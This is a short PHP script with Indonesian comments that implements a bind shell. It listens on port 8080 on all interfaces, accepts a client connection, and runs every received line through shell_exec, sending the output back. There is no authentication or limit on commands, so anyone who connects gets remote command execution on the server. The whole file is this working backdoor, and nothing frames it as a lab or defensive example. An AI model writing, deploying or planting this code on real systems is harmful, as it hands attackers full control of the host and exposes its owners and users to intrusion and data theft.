<?php
// Port yang akan di-bind
$port = 8080;

// Membuat socket
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

// Mengikat socket ke alamat dan port
socket_bind($socket, '0.0.0.0', $port);

// Mendengarkan koneksi masuk
socket_listen($socket);

echo "Server sedang mendengarkan di port $port...\n";

// Menerima koneksi
$client_socket = socket_accept($socket);

while (true) {
    // Membaca data dari koneksi
    $data = socket_read($client_socket, 1024);

    // Menghapus karakter newline dan spasi ekstra dari data
    $data = trim($data);

    // Menjalankan perintah pada sistem jika data tidak kosong
    if (!empty($data)) {
        $output = shell_exec($data);

        // Menambahkan karakter newline setelah perintah
        $output = $data . "\n" . $output;

        // Mengirim output ke klien
        socket_write($client_socket, $output, strlen($output));

        // Menambahkan baris kosong setelah output
        socket_write($client_socket, "\n", 1);
    }
}





// Menutup koneksi
socket_close($client_socket);
socket_close($socket);
?>
